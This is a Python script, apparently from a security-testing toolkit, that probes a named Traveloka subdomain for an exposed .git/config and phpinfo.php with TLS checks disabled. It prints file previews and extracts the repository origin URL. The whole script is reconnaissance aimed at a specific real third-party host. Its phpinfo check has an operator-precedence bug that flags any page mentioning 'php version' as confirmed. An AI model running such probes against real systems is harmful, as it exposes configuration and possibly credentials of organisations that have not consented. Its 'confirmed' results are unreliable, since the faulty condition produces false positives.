import asyncio
import httpx
from aura.ui.formatter import console

async def verify_traveloka_criticals(url):
    console.print(f"[*] Verifying Critical hits on {url}")
    async with httpx.AsyncClient(verify=False, timeout=10) as client:
        # 1. Git Config
        r1 = await client.get(f"{url}/.git/config")
        if r1.status_code == 200 and "[core]" in r1.text:
            console.print(f"  [bold red][!!!] CONFIRMED: .git/config is OPEN![/bold red]")
            console.print(f"    -> Preview: {r1.text[:200]}...")
            
            # 2. Try to get repo origin
            if "url =" in r1.text:
                repo_url = r1.text.split("url =")[1].split("\n")[0].strip()
                console.print(f"    [!] Repo Origin: {repo_url}")
        else:
            console.print(f"  [yellow][.] .git/config status: {r1.status_code}[/yellow]")

        # 2. PHPInfo
        r2 = await client.get(f"{url}/phpinfo.php")
        if r2.status_code == 200 and "phpinfo()" in r2.text.lower() or "php version" in r2.text.lower():
            console.print(f"  [bold red][!!!] CONFIRMED: phpinfo.php is OPEN![/bold red]")
            console.print(f"    -> Preview: {r2.text[:200]}...")
        else:
            console.print(f"  [yellow][.] phpinfo.php status: {r2.status_code}[/yellow]")

if __name__ == "__main__":
    url = "https://afb.xxt.traveloka.com"
    asyncio.run(verify_traveloka_criticals(url))
